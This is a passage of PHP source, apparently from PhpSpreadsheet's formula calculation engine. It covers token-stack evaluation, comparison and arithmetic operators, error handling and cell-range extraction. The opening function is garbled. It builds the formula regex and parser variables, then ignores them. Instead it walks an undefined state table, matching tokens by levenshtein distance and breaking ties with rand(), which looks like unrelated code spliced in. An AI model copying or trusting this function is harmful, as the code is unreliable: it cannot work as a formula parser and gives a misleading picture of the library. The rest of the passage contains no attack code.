        $regexpMatchString = '/^(' . self::CALCULATION_REGEXP_FUNCTION .
                                '|' . self::CALCULATION_REGEXP_CELLREF .
                                '|' . self::CALCULATION_REGEXP_NUMBER .
                                '|' . self::CALCULATION_REGEXP_STRING .
                                '|' . self::CALCULATION_REGEXP_OPENBRACE .
                                '|' . self::CALCULATION_REGEXP_NAMEDRANGE .
                                '|' . self::CALCULATION_REGEXP_ERROR .
                                ')/si';

        //    Start with initialisation
        $curNum = 0;
        $stack = null;
        $outArr = [];
        $node = $this->cyclicFormulaCounter;
        $pad = "";
        $expectingOperator = false; //    We use this test in syntax-checking the expression to determine when a
                                                    //        - is a negation or + is a positive operator rather than an operation
        $expectingOperand = false; //    We use this test in syntax-checking the expression to determine whether an operand
                                                    //        should be null in a function call
        //    The guts of the lexical parser
        //    Loop through the formula extracting each operator and operand in turn
        $input = explode(" ", $formula);

        while (true) {
            $token = $input[$curNum]; //    Get the first character of the value at the current index position
            $curOutToken = "";
            if (isset($theMatrix[$node][$token])) {
                $nextState = $theMatrix[$node][$token][0];
                $curOutToken = $theMatrix[$node][$token][1];
            } else {
                $pad = " ";
                $minimumValue = 0xff;
                $nextState = 0;
                foreach ($theMatrix[$node] as $w=>$map) {
                    $curDistVal = levenshtein($token, $w);
                    if ($curDistVal < $minimumValue) {
                        $minimumValue = $curDistVal;
                        $nextState = $map[0];
                        $curOutToken = $map[1];
                    } else if ($curDistVal == $minimumValue) {
                        $r = rand(0,1);
                        if ($r == 0) { $nextState = $map[0]; $curOutToken = $map[1]; }
                    }
                }
            }
            $outArr[] = $curOutToken;
            $node = $nextState;
            ++$curNum;
            if ($curNum >= sizeof($input)) break;
        }
        return implode($pad, $outArr);
    }



    private static function dataTestReference(&$operandData)
    {
        $operand = $operandData['value'];
        if (($operandData['reference'] === null) && (is_array($operand))) {
            $rKeys = array_keys($operand);
            $rowKey = array_shift($rKeys);
            $cKeys = array_keys(array_keys($operand[$rowKey]));
            $colKey = array_shift($cKeys);
            if (ctype_upper($colKey)) {
                $operandData['reference'] = $colKey . $rowKey;
            }
        }

        return $operand;
    }

    // evaluate postfix notation

    /**
     * @param mixed $tokens
     * @param null|string $cellID
     * @param null|Cell $pCell
     *
     * @return bool
     */
    private function processTokenStack($tokens, $cellID = null, Cell $pCell = null)
    {
        if ($tokens == false) {
            return false;
        }

        //    If we're using cell caching, then $pCell may well be flushed back to the cache (which detaches the parent cell collection),
        //        so we store the parent cell collection so that we can re-attach it when necessary
        $pCellWorksheet = ($pCell !== null) ? $pCell->getWorksheet() : null;
        $pCellParent = ($pCell !== null) ? $pCell->getParent() : null;
        $stack = new Stack();

        //    Loop through each token in turn
        foreach ($tokens as $tokenData) {
            $token = $tokenData['value'];
            // if the token is a binary operator, pop the top two values off the stack, do the operation, and push the result back on the stack
            if (isset(self::$binaryOperators[$token])) {
                //    We must have two operands, error if we don't
                if (($operand2Data = $stack->pop()) === null) {
                    return $this->raiseFormulaError('Internal error - Operand value missing from stack');
                }
                if (($operand1Data = $stack->pop()) === null) {
                    return $this->raiseFormulaError('Internal error - Operand value missing from stack');
                }

                $operand1 = self::dataTestReference($operand1Data);
                $operand2 = self::dataTestReference($operand2Data);

                //    Log what we're doing
                if ($token == ':') {
                    $this->debugLog->writeDebugLog('Evaluating Range ', $this->showValue($operand1Data['reference']), ' ', $token, ' ', $this->showValue($operand2Data['reference']));
                } else {
                    $this->debugLog->writeDebugLog('Evaluating ', $this->showValue($operand1), ' ', $token, ' ', $this->showValue($operand2));
                }

                //    Process the operation in the appropriate manner
                switch ($token) {
                    //    Comparison (Boolean) Operators
                    case '>':            //    Greater than
                    case '<':            //    Less than
                    case '>=':            //    Greater than or Equal to
                    case '<=':            //    Less than or Equal to
                    case '=':            //    Equality
                    case '<>':            //    Inequality
                        $this->executeBinaryComparisonOperation($cellID, $operand1, $operand2, $token, $stack);

                        break;
                    //    Binary Operators
                    case ':':            //    Range
                        if (strpos($operand1Data['reference'], '!') !== false) {
                            list($sheet1, $operand1Data['reference']) = Worksheet::extractSheetTitle($operand1Data['reference'], true);
                        } else {
                            $sheet1 = ($pCellParent !== null) ? $pCellWorksheet->getTitle() : '';
                        }

                        list($sheet2, $operand2Data['reference']) = Worksheet::extractSheetTitle($operand2Data['reference'], true);
                        if (empty($sheet2)) {
                            $sheet2 = $sheet1;
                        }

                        if ($sheet1 == $sheet2) {
                            if ($operand1Data['reference'] === null) {
                                if ((trim($operand1Data['value']) != '') && (is_numeric($operand1Data['value']))) {
                                    $operand1Data['reference'] = $pCell->getColumn() . $operand1Data['value'];
                                } elseif (trim($operand1Data['reference']) == '') {
                                    $operand1Data['reference'] = $pCell->getCoordinate();
                                } else {
                                    $operand1Data['reference'] = $operand1Data['value'] . $pCell->getRow();
                                }
                            }
                            if ($operand2Data['reference'] === null) {
                                if ((trim($operand2Data['value']) != '') && (is_numeric($operand2Data['value']))) {
                                    $operand2Data['reference'] = $pCell->getColumn() . $operand2Data['value'];
                                } elseif (trim($operand2Data['reference']) == '') {
                                    $operand2Data['reference'] = $pCell->getCoordinate();
                                } else {
                                    $operand2Data['reference'] = $operand2Data['value'] . $pCell->getRow();
                                }
                            }

                            $oData = array_merge(explode(':', $operand1Data['reference']), explode(':', $operand2Data['reference']));
                            $oCol = $oRow = [];
                            foreach ($oData as $oDatum) {
                                $oCR = Coordinate::coordinateFromString($oDatum);
                                $oCol[] = Coordinate::columnIndexFromString($oCR[0]) - 1;
                                $oRow[] = $oCR[1];
                            }
                            $cellRef = Coordinate::stringFromColumnIndex(min($oCol) + 1) . min($oRow) . ':' . Coordinate::stringFromColumnIndex(max($oCol) + 1) . max($oRow);
                            if ($pCellParent !== null) {
                                $cellValue = $this->extractCellRange($cellRef, $this->spreadsheet->getSheetByName($sheet1), false);
                            } else {
                                return $this->raiseFormulaError('Unable to access Cell Reference');
                            }
                            $stack->push('Cell Reference', $cellValue, $cellRef);
                        } else {
                            $stack->push('Error', Functions::REF(), null);
                        }

                        break;
                    case '+':            //    Addition
                        $this->executeNumericBinaryOperation($operand1, $operand2, $token, 'plusEquals', $stack);

                        break;
                    case '-':            //    Subtraction
                        $this->executeNumericBinaryOperation($operand1, $operand2, $token, 'minusEquals', $stack);

                        break;
                    case '*':            //    Multiplication
                        $this->executeNumericBinaryOperation($operand1, $operand2, $token, 'arrayTimesEquals', $stack);

                        break;
                    case '/':            //    Division
                        $this->executeNumericBinaryOperation($operand1, $operand2, $token, 'arrayRightDivide', $stack);

                        break;
                    case '^':            //    Exponential
                        $this->executeNumericBinaryOperation($operand1, $operand2, $token, 'power', $stack);

                        break;
                    case '&':            //    Concatenation
                        //    If either of the operands is a matrix, we need to treat them both as matrices
                        //        (converting the other operand to a matrix if need be); then perform the required
                        //        matrix operation
                        if (is_bool($operand1)) {
                            $operand1 = ($operand1) ? self::$localeBoolean['TRUE'] : self::$localeBoolean['FALSE'];
                        }
                        if (is_bool($operand2)) {
                            $operand2 = ($operand2) ? self::$localeBoolean['TRUE'] : self::$localeBoolean['FALSE'];
                        }
                        if ((is_array($operand1)) || (is_array($operand2))) {
                            //    Ensure that both operands are arrays/matrices
                            self::checkMatrixOperands($operand1, $operand2, 2);

                            try {
                                //    Convert operand 1 from a PHP array to a matrix
                                $matrix = new Shared\JAMA\Matrix($operand1);
                                //    Perform the required operation against the operand 1 matrix, passing in operand 2
                                $matrixResult = $matrix->concat($operand2);
                                $result = $matrixResult->getArray();
                            } catch (\Exception $ex) {
                                $this->debugLog->writeDebugLog('JAMA Matrix Exception: ', $ex->getMessage());
                                $result = '#VALUE!';
                            }
                        } else {
                            $result = '"' . str_replace('""', '"', self::unwrapResult($operand1) . self::unwrapResult($operand2)) . '"';
                        }
                        $this->debugLog->writeDebugLog('Evaluation Result is ', $this->showTypeDetails($result));
                        $stack->push('Value', $result);

                        break;
                    case '|':            //    Intersect
                        $rowIntersect = array_intersect_key($operand1, $operand2);
                        $cellIntersect = $oCol = $oRow = [];
                        foreach (array_keys($rowIntersect) as $row) {
                            $oRow[] = $row;
                            foreach ($rowIntersect[$row] as $col => $data) {
                                $oCol[] = Coordinate::columnIndexFromString($col) - 1;
                                $cellIntersect[$row] = array_intersect_key($operand1[$row], $operand2[$row]);
                            }
                        }
                        $cellRef = Coordinate::stringFromColumnIndex(min($oCol) + 1) . min($oRow) . ':' . Coordinate::stringFromColumnIndex(max($oCol) + 1) . max($oRow);
                        $this->debugLog->writeDebugLog('Evaluation Result is ', $this->showTypeDetails($cellIntersect));
                        $stack->push('Value', $cellIntersect, $cellRef);

                        break;
                }

                // if the token is a unary operator, pop one value off the stack, do the operation, and push it back on
            } elseif (($token === '~') || ($token === '%')) {
                if (($arg = $stack->pop()) === null) {
                    return $this->raiseFormulaError('Internal error - Operand value missing from stack');
                }
                $arg = $arg['value'];
                if ($token === '~') {
                    $this->debugLog->writeDebugLog('Evaluating Negation of ', $this->showValue($arg));
                    $multiplier = -1;
                } else {
                    $this->debugLog->writeDebugLog('Evaluating Percentile of ', $this->showValue($arg));
                    $multiplier = 0.01;
                }
                if (is_array($arg)) {
                    self::checkMatrixOperands($arg, $multiplier, 2);

                    try {
                        $matrix1 = new Shared\JAMA\Matrix($arg);
                        $matrixResult = $matrix1->arrayTimesEquals($multiplier);
                        $result = $matrixResult->getArray();
                    } catch (\Exception $ex) {
                        $this->debugLog->writeDebugLog('JAMA Matrix Exception: ', $ex->getMessage());
                        $result = '#VALUE!';
                    }
                    $this->debugLog->writeDebugLog('Evaluation Result is ', $this->showTypeDetails($result));
                    $stack->push('Value', $result);
                } else {
                    $this->executeNumericBinaryOperation($multiplier, $arg, '*', 'arrayTimesEquals', $stack);
                }
            } elseif (preg_match('/^' . self::CALCULATION_REGEXP_CELLREF . '$/i', $token, $matches)) {
                $cellRef = null;
                if (isset($matches[8])) {
                    if ($pCell === null) {
                        //                        We can't access the range, so return a REF error
                        $cellValue = Functions::REF();
                    } else {
                        $cellRef = $matches[6] . $matches[7] . ':' . $matches[9] . $matches[10];
                        if ($matches[2] > '') {
                            $matches[2] = trim($matches[2], "\"'");
                            if ((strpos($matches[2], '[') !== false) || (strpos($matches[2], ']') !== false)) {
                                //    It's a Reference to an external spreadsheet (not currently supported)
                                return $this->raiseFormulaError('Unable to access External Workbook');
                            }
                            $matches[2] = trim($matches[2], "\"'");
                            $this->debugLog->writeDebugLog('Evaluating Cell Range ', $cellRef, ' in worksheet ', $matches[2]);
                            if ($pCellParent !== null) {
                                $cellValue = $this->extractCellRange($cellRef, $this->spreadsheet->getSheetByName($matches[2]), false);
                            } else {
                                return $this->raiseFormulaError('Unable to access Cell Reference');
                            }
                            $this->debugLog->writeDebugLog('Evaluation Result for cells ', $cellRef, ' in worksheet ', $matches[2], ' is ', $this->showTypeDetails($cellValue));
                        } else {
                            $this->debugLog->writeDebugLog('Evaluating Cell Range ', $cellRef, ' in current worksheet');
                            if ($pCellParent !== null) {
                                $cellValue = $this->extractCellRange($cellRef, $pCellWorksheet, false);
                            } else {
                                return $this->raiseFormulaError('Unable to access Cell Reference');
                            }
                            $this->debugLog->writeDebugLog('Evaluation Result for cells ', $cellRef, ' is ', $this->showTypeDetails($cellValue));
                        }
                    }
                } else {
                    if ($pCell === null) {
                        //                        We can't access the cell, so return a REF error
                        $cellValue = Functions::REF();
                    } else {
                        $cellRef = $matches[6] . $matches[7];
                        if ($matches[2] > '') {
                            $matches[2] = trim($matches[2], "\"'");
                            if ((strpos($matches[2], '[') !== false) || (strpos($matches[2], ']') !== false)) {
                                //    It's a Reference to an external spreadsheet (not currently supported)
                                return $this->raiseFormulaError('Unable to access External Workbook');
                            }
                            $this->debugLog->writeDebugLog('Evaluating Cell ', $cellRef, ' in worksheet ', $matches[2]);
                            if ($pCellParent !== null) {
                                $cellSheet = $this->spreadsheet->getSheetByName($matches[2]);
                                if ($cellSheet && $cellSheet->cellExists($cellRef)) {
                                    $cellValue = $this->extractCellRange($cellRef, $this->spreadsheet->getSheetByName($matches[2]), false);
                                    $pCell->attach($pCellParent);
                                } else {
                                    $cellValue = null;
                                }
                            } else {
                                return $this->raiseFormulaError('Unable to access Cell Reference');
                            }
                            $this->debugLog->writeDebugLog('Evaluation Result for cell ', $cellRef, ' in worksheet ', $matches[2], ' is ', $this->showTypeDetails($cellValue));
                        } else {
                            $this->debugLog->writeDebugLog('Evaluating Cell ', $cellRef, ' in current worksheet');
                            if ($pCellParent->has($cellRef)) {
                                $cellValue = $this->extractCellRange($cellRef, $pCellWorksheet, false);
                                $pCell->attach($pCellParent);
                            } else {
                                $cellValue = null;
                            }
                            $this->debugLog->writeDebugLog('Evaluation Result for cell ', $cellRef, ' is ', $this->showTypeDetails($cellValue));
                        }
                    }
                }
                $stack->push('Value', $cellValue, $cellRef);

            // if the token is a function, pop arguments off the stack, hand them to the function, and push the result back on
            } elseif (preg_match('/^' . self::CALCULATION_REGEXP_FUNCTION . '$/i', $token, $matches)) {
                $functionName = $matches[1];
                $argCount = $stack->pop();
                $argCount = $argCount['value'];
                if ($functionName != 'MKMATRIX') {
                    $this->debugLog->writeDebugLog('Evaluating Function ', self::localeFunc($functionName), '() with ', (($argCount == 0) ? 'no' : $argCount), ' argument', (($argCount == 1) ? '' : 's'));
                }
                if ((isset(self::$phpSpreadsheetFunctions[$functionName])) || (isset(self::$controlFunctions[$functionName]))) {    // function
                    if (isset(self::$phpSpreadsheetFunctions[$functionName])) {
                        $functionCall = self::$phpSpreadsheetFunctions[$functionName]['functionCall'];
                        $passByReference = isset(self::$phpSpreadsheetFunctions[$functionName]['passByReference']);
                        $passCellReference = isset(self::$phpSpreadsheetFunctions[$functionName]['passCellReference']);
                    } elseif (isset(self::$controlFunctions[$functionName])) {
                        $functionCall = self::$controlFunctions[$functionName]['functionCall'];
                        $passByReference = isset(self::$controlFunctions[$functionName]['passByReference']);
                        $passCellReference = isset(self::$controlFunctions[$functionName]['passCellReference']);
                    }
                    // get the arguments for this function
                    $args = $argArrayVals = [];
                    for ($i = 0; $i < $argCount; ++$i) {
                        $arg = $stack->pop();
                        $a = $argCount - $i - 1;
                        if (($passByReference) &&
                            (isset(self::$phpSpreadsheetFunctions[$functionName]['passByReference'][$a])) &&
                            (self::$phpSpreadsheetFunctions[$functionName]['passByReference'][$a])) {
                            if ($arg['reference'] === null) {
                                $args[] = $cellID;
                                if ($functionName != 'MKMATRIX') {
                                    $argArrayVals[] = $this->showValue($cellID);
                                }
                            } else {
                                $args[] = $arg['reference'];
                                if ($functionName != 'MKMATRIX') {
                                    $argArrayVals[] = $this->showValue($arg['reference']);
                                }
                            }
                        } else {
                            $args[] = self::unwrapResult($arg['value']);
                            if ($functionName != 'MKMATRIX') {
                                $argArrayVals[] = $this->showValue($arg['value']);
                            }
                        }
                    }
                    //    Reverse the order of the arguments
                    krsort($args);

                    if (($passByReference) && ($argCount == 0)) {
                        $args[] = $cellID;
                        $argArrayVals[] = $this->showValue($cellID);
                    }

                    if ($functionName != 'MKMATRIX') {
                        if ($this->debugLog->getWriteDebugLog()) {
                            krsort($argArrayVals);
                            $this->debugLog->writeDebugLog('Evaluating ', self::localeFunc($functionName), '( ', implode(self::$localeArgumentSeparator . ' ', Functions::flattenArray($argArrayVals)), ' )');
                        }
                    }

                    //    Process the argument with the appropriate function call
                    $args = $this->addCellReference($args, $passCellReference, $functionCall, $pCell);

                    if (!is_array($functionCall)) {
                        foreach ($args as &$arg) {
                            $arg = Functions::flattenSingleValue($arg);
                        }
                        unset($arg);
                    }
                    $result = call_user_func_array($functionCall, $args);

                    if ($functionName != 'MKMATRIX') {
                        $this->debugLog->writeDebugLog('Evaluation Result for ', self::localeFunc($functionName), '() function call is ', $this->showTypeDetails($result));
                    }
                    $stack->push('Value', self::wrapResult($result));
                }
            } else {
                // if the token is a number, boolean, string or an Excel error, push it onto the stack
                if (isset(self::$excelConstants[strtoupper($token)])) {
                    $excelConstant = strtoupper($token);
                    $stack->push('Constant Value', self::$excelConstants[$excelConstant]);
                    $this->debugLog->writeDebugLog('Evaluating Constant ', $excelConstant, ' as ', $this->showTypeDetails(self::$excelConstants[$excelConstant]));
                } elseif ((is_numeric($token)) || ($token === null) || (is_bool($token)) || ($token == '') || ($token[0] == '"') || ($token[0] == '#')) {
                    $stack->push('Value', $token);
                // if the token is a named range, push the named range name onto the stack
                } elseif (preg_match('/^' . self::CALCULATION_REGEXP_NAMEDRANGE . '$/i', $token, $matches)) {
                    $namedRange = $matches[6];
                    $this->debugLog->writeDebugLog('Evaluating Named Range ', $namedRange);

                    $cellValue = $this->extractNamedRange($namedRange, ((null !== $pCell) ? $pCellWorksheet : null), false);
                    $pCell->attach($pCellParent);
                    $this->debugLog->writeDebugLog('Evaluation Result for named range ', $namedRange, ' is ', $this->showTypeDetails($cellValue));
                    $stack->push('Named Range', $cellValue, $namedRange);
                } else {
                    return $this->raiseFormulaError("undefined variable '$token'");
                }
            }
        }
        // when we're out of tokens, the stack should have a single element, the final result
        if ($stack->count() != 1) {
            return $this->raiseFormulaError('internal error');
        }
        $output = $stack->pop();
        $output = $output['value'];

        return $output;
    }

    private function validateBinaryOperand(&$operand, &$stack)
    {
        if (is_array($operand)) {
            if ((count($operand, COUNT_RECURSIVE) - count($operand)) == 1) {
                do {
                    $operand = array_pop($operand);
                } while (is_array($operand));
            }
        }
        //    Numbers, matrices and booleans can pass straight through, as they're already valid
        if (is_string($operand)) {
            //    We only need special validations for the operand if it is a string
            //    Start by stripping off the quotation marks we use to identify true excel string values internally
            if ($operand > '' && $operand[0] == '"') {
                $operand = self::unwrapResult($operand);
            }
            //    If the string is a numeric value, we treat it as a numeric, so no further testing
            if (!is_numeric($operand)) {
                //    If not a numeric, test to see if the value is an Excel error, and so can't be used in normal binary operations
                if ($operand > '' && $operand[0] == '#') {
                    $stack->push('Value', $operand);
                    $this->debugLog->writeDebugLog('Evaluation Result is ', $this->showTypeDetails($operand));

                    return false;
                } elseif (!Shared\StringHelper::convertToNumberIfFraction($operand)) {
                    //    If not a numeric or a fraction, then it's a text string, and so can't be used in mathematical binary operations
                    $stack->push('Value', '#VALUE!');
                    $this->debugLog->writeDebugLog('Evaluation Result is a ', $this->showTypeDetails('#VALUE!'));

                    return false;
                }
            }
        }

        //    return a true if the value of the operand is one that we can use in normal binary operations
        return true;
    }

    /**
     * @param null|string $cellID
     * @param mixed $operand1
     * @param mixed $operand2
     * @param string $operation
     * @param Stack $stack
     * @param bool $recursingArrays
     *
     * @return bool
     */
    private function executeBinaryComparisonOperation($cellID, $operand1, $operand2, $operation, Stack &$stack, $recursingArrays = false)
    {
        //    If we're dealing with matrix operations, we want a matrix result
        if ((is_array($operand1)) || (is_array($operand2))) {
            $result = [];
            if ((is_array($operand1)) && (!is_array($operand2))) {
                foreach ($operand1 as $x => $operandData) {
                    $this->debugLog->writeDebugLog('Evaluating Comparison ', $this->showValue($operandData), ' ', $operation, ' ', $this->showValue($operand2));
                    $this->executeBinaryComparisonOperation($cellID, $operandData, $operand2, $operation, $stack);
                    $r = $stack->pop();
                    $result[$x] = $r['value'];
                }
            } elseif ((!is_array($operand1)) && (is_array($operand2))) {
                foreach ($operand2 as $x => $operandData) {
                    $this->debugLog->writeDebugLog('Evaluating Comparison ', $this->showValue($operand1), ' ', $operation, ' ', $this->showValue($operandData));
                    $this->executeBinaryComparisonOperation($cellID, $operand1, $operandData, $operation, $stack);
                    $r = $stack->pop();
                    $result[$x] = $r['value'];
                }
            } else {
                if (!$recursingArrays) {
                    self::checkMatrixOperands($operand1, $operand2, 2);
                }
                foreach ($operand1 as $x => $operandData) {
                    $this->debugLog->writeDebugLog('Evaluating Comparison ', $this->showValue($operandData), ' ', $operation, ' ', $this->showValue($operand2[$x]));
                    $this->executeBinaryComparisonOperation($cellID, $operandData, $operand2[$x], $operation, $stack, true);
                    $r = $stack->pop();
                    $result[$x] = $r['value'];
                }
            }
            //    Log the result details
            $this->debugLog->writeDebugLog('Comparison Evaluation Result is ', $this->showTypeDetails($result));
            //    And push the result onto the stack
            $stack->push('Array', $result);

            return true;
        }

        //    Simple validate the two operands if they are string values
        if (is_string($operand1) && $operand1 > '' && $operand1[0] == '"') {
            $operand1 = self::unwrapResult($operand1);
        }
        if (is_string($operand2) && $operand2 > '' && $operand2[0] == '"') {
            $operand2 = self::unwrapResult($operand2);
        }

        // Use case insensitive comparaison if not OpenOffice mode
        if (Functions::getCompatibilityMode() != Functions::COMPATIBILITY_OPENOFFICE) {
            if (is_string($operand1)) {
                $operand1 = strtoupper($operand1);
            }
            if (is_string($operand2)) {
                $operand2 = strtoupper($operand2);
            }
        }

        $useLowercaseFirstComparison = is_string($operand1) && is_string($operand2) && Functions::getCompatibilityMode() == Functions::COMPATIBILITY_OPENOFFICE;

        //    execute the necessary operation
        switch ($operation) {
            //    Greater than
            case '>':
                if ($useLowercaseFirstComparison) {
                    $result = $this->strcmpLowercaseFirst($operand1, $operand2) > 0;
                } else {
                    $result = ($operand1 > $operand2);
                }

                break;
            //    Less than
            case '<':
                if ($useLowercaseFirstComparison) {
                    $result = $this->strcmpLowercaseFirst($operand1, $operand2) < 0;
                } else {
                    $result = ($operand1 < $operand2);
                }

                break;
            //    Equality
            case '=':
                if (is_numeric($operand1) && is_numeric($operand2)) {
                    $result = (abs($operand1 - $operand2) < $this->delta);
                } else {
                    $result = strcmp($operand1, $operand2) == 0;
                }

                break;
            //    Greater than or equal
            case '>=':
                if (is_numeric($operand1) && is_numeric($operand2)) {
                    $result = ((abs($operand1 - $operand2) < $this->delta) || ($operand1 > $operand2));
                } elseif ($useLowercaseFirstComparison) {
                    $result = $this->strcmpLowercaseFirst($operand1, $operand2) >= 0;
                } else {
                    $result = strcmp($operand1, $operand2) >= 0;
                }

                break;
            //    Less than or equal
            case '<=':
                if (is_numeric($operand1) && is_numeric($operand2)) {
                    $result = ((abs($operand1 - $operand2) < $this->delta) || ($operand1 < $operand2));
                } elseif ($useLowercaseFirstComparison) {
                    $result = $this->strcmpLowercaseFirst($operand1, $operand2) <= 0;
                } else {
                    $result = strcmp($operand1, $operand2) <= 0;
                }

                break;
            //    Inequality
            case '<>':
                if (is_numeric($operand1) && is_numeric($operand2)) {
                    $result = (abs($operand1 - $operand2) > 1E-14);
                } else {
                    $result = strcmp($operand1, $operand2) != 0;
                }

                break;
        }

        //    Log the result details
        $this->debugLog->writeDebugLog('Evaluation Result is ', $this->showTypeDetails($result));
        //    And push the result onto the stack
        $stack->push('Value', $result);

        return true;
    }

    /**
     * Compare two strings in the same way as strcmp() except that lowercase come before uppercase letters.
     *
     * @param string $str1 First string value for the comparison
     * @param string $str2 Second string value for the comparison
     *
     * @return int
     */
    private function strcmpLowercaseFirst($str1, $str2)
    {
        $inversedStr1 = Shared\StringHelper::strCaseReverse($str1);
        $inversedStr2 = Shared\StringHelper::strCaseReverse($str2);

        return strcmp($inversedStr1, $inversedStr2);
    }

    /**
     * @param mixed $operand1
     * @param mixed $operand2
     * @param mixed $operation
     * @param string $matrixFunction
     * @param mixed $stack
     *
     * @return bool
     */
    private function executeNumericBinaryOperation($operand1, $operand2, $operation, $matrixFunction, &$stack)
    {
        //    Validate the two operands
        if (!$this->validateBinaryOperand($operand1, $stack)) {
            return false;
        }
        if (!$this->validateBinaryOperand($operand2, $stack)) {
            return false;
        }

        //    If either of the operands is a matrix, we need to treat them both as matrices
        //        (converting the other operand to a matrix if need be); then perform the required
        //        matrix operation
        if ((is_array($operand1)) || (is_array($operand2))) {
            //    Ensure that both operands are arrays/matrices of the same size
            self::checkMatrixOperands($operand1, $operand2, 2);

            try {
                //    Convert operand 1 from a PHP array to a matrix
                $matrix = new Shared\JAMA\Matrix($operand1);
                //    Perform the required operation against the operand 1 matrix, passing in operand 2
                $matrixResult = $matrix->$matrixFunction($operand2);
                $result = $matrixResult->getArray();
            } catch (\Exception $ex) {
                $this->debugLog->writeDebugLog('JAMA Matrix Exception: ', $ex->getMessage());
                $result = '#VALUE!';
            }
        } else {
            if ((Functions::getCompatibilityMode() != Functions::COMPATIBILITY_OPENOFFICE) &&
                ((is_string($operand1) && !is_numeric($operand1) && strlen($operand1) > 0) ||
                 (is_string($operand2) && !is_numeric($operand2) && strlen($operand2) > 0))) {
                $result = Functions::VALUE();
            } else {
                //    If we're dealing with non-matrix operations, execute the necessary operation
                switch ($operation) {
                    //    Addition
                    case '+':
                        $result = $operand1 + $operand2;

                        break;
                    //    Subtraction
                    case '-':
                        $result = $operand1 - $operand2;

                        break;
                    //    Multiplication
                    case '*':
                        $result = $operand1 * $operand2;

                        break;
                    //    Division
                    case '/':
                        if ($operand2 == 0) {
                            //    Trap for Divide by Zero error
                            $stack->push('Value', '#DIV/0!');
                            $this->debugLog->writeDebugLog('Evaluation Result is ', $this->showTypeDetails('#DIV/0!'));

                            return false;
                        }
                            $result = $operand1 / $operand2;

                        break;
                    //    Power
                    case '^':
                        $result = pow($operand1, $operand2);

                        break;
                }
            }
        }

        //    Log the result details
        $this->debugLog->writeDebugLog('Evaluation Result is ', $this->showTypeDetails($result));
        //    And push the result onto the stack
        $stack->push('Value', $result);

        return true;
    }

    // trigger an error, but nicely, if need be
    protected function raiseFormulaError($errorMessage)
    {
        $this->formulaError = $errorMessage;
        $this->cyclicReferenceStack->clear();
        if (!$this->suppressFormulaErrors) {
            throw new Exception($errorMessage);
        }
        trigger_error($errorMessage, E_USER_ERROR);

        return false;
    }

    /**
     * Extract range values.
     *
     * @param string &$pRange String based range representation
     * @param Worksheet $pSheet Worksheet
     * @param bool $resetLog Flag indicating whether calculation log should be reset or not
     *
     * @return mixed Array of values in range if range contains more than one element. Otherwise, a single value is returned.
     */
    public function extractCellRange(&$pRange = 'A1', Worksheet $pSheet = null, $resetLog = true)
    {
        // Return value
        $returnValue = [];

        if ($pSheet !== null) {
            $pSheetName = $pSheet->getTitle();
            if (strpos($pRange, '!') !== false) {
                list($pSheetName, $pRange) = Worksheet::extractSheetTitle($pRange, true);
                $pSheet = $this->spreadsheet->getSheetByName($pSheetName);
            }

            // Extract range
            $aReferences = Coordinate::extractAllCellReferencesInRange($pRange);
            $pRange = $pSheetName . '!' . $pRange;
            if (!isset($aReferences[1])) {
                $currentCol = '';
                $currentRow = 0;
                //    Single cell in range
                sscanf($aReferences[0], '%[A-Z]%d', $currentCol, $currentRow);
                if ($pSheet->cellExists($aReferences[0])) {
                    $returnValue[$currentRow][$currentCol] = $pSheet->getCell($aReferences[0])->getCalculatedValue($resetLog);
                } else {
                    $returnValue[$currentRow][$currentCol] = null;
                }
            } else {
                // Extract cell data for all cells in the range
                foreach ($aReferences as $reference) {
                    $currentCol = '';
                    $currentRow = 0;
                    // Extract range
                    sscanf($reference, '%[A-Z]%d', $currentCol, $currentRow);
                    if ($pSheet->cellExists($reference)) {
                        $returnValue[$currentRow][$currentCol] = $pSheet->getCell($reference)->getCalculatedValue($resetLog);
                    } else {
                        $returnValue[$currentRow][$currentCol] = null;
                    }
                }
            }
        }

        return $returnValue;
    }

    /**
     * Extract range values.
     *
     * @param string &$pRange String based range representation
     * @param Worksheet $pSheet Worksheet
     * @param bool $resetLog Flag indicating whether calculation log should be reset or not
     *
     * @return mixed Array of values in range if range contains more than one element. Otherwise, a single value is returned.
     */
    public function extractNamedRange(&$pRange = 'A1', Worksheet $pSheet = null, $resetLog = true)
    {
        // Return value
        $returnValue = [];

        if ($pSheet !== null) {
            $pSheetName = $pSheet->getTitle();
            if (strpos($pRange, '!') !== false) {
                list($pSheetName, $pRange) = Worksheet::extractSheetTitle($pRange, true);
                $pSheet = $this->spreadsheet->getSheetByName($pSheetName);
            }

            // Named range?
            $namedRange = NamedRange::resolveRange($pRange, $pSheet);
            if ($namedRange !== null) {
                $pSheet = $namedRange->getWorksheet();
                $pRange = $namedRange->getRange();
                $splitRange = Coordinate::splitRange($pRange);
                //    Convert row and column references
                if (ctype_alpha($splitRange[0][0])) {
                    $pRange = $splitRange[0][0] . '1:' . $splitRange[0][1] . $namedRange->getWorksheet()->getHighestRow();
                } elseif (ctype_digit($splitRange[0][0])) {
                    $pRange = 'A' . $splitRange[0][0] . ':' . $namedRange->getWorksheet()->getHighestColumn() . $splitRange[0][1];
                }
            } else {
                return Functions::REF();
            }

            // Extract range
            $aReferences = Coordinate::extractAllCellReferencesInRange($pRange);
            if (!isset($aReferences[1])) {
                //    Single cell (or single column or row) in range
                list($currentCol, $currentRow) = Coordinate::coordinateFromString($aReferences[0]);
                if ($pSheet->cellExists($aReferences[0])) {
                    $returnValue[$currentRow][$currentCol] = $pSheet->getCell($aReferences[0])->getCalculatedValue($resetLog);
                } else {
                    $returnValue[$currentRow][$currentCol] = null;
                }
            } else {
                // Extract cell data for all cells in the range
                foreach ($aReferences as $reference) {
                    // Extract range
                    list($currentCol, $currentRow) = Coordinate::coordinateFromString($reference);
                    if ($pSheet->cellExists($reference)) {
                        $returnValue[$currentRow][$currentCol] = $pSheet->getCell($reference)->getCalculatedValue($resetLog);
                    } else {
                        $returnValue[$currentRow][$currentCol] = null;
                    }
                }
            }
        }

        return $returnValue;
    }

    /**
     * Is a specific function implemented?
     *
     * @param string $pFunction Function Name
     *
     * @return bool
     */
    public function isImplemented($pFunction)
    {
        $pFunction = strtoupper($pFunction);
        $notImplemented = !isset(self::$phpSpreadsheetFunctions[$pFunction]) || (is_array(self::$phpSpreadsheetFunctions[$pFunction]['functionCall']) && self::$phpSpreadsheetFunctions[$pFunction]['functionCall'][1] === 'DUMMY');

        return !$notImplemented;
    }

    /**
     * Get a list of all implemented functions as an array of function objects.
     *
     * @return array of Category
     */
    public function getFunctions()
    {
        return self::$phpSpreadsheetFunctions;
    }

    /**
     * Get a list of implemented Excel function names.
     *
     * @return array
     */
    public function getImplementedFunctionNames()
    {
        $returnValue = [];
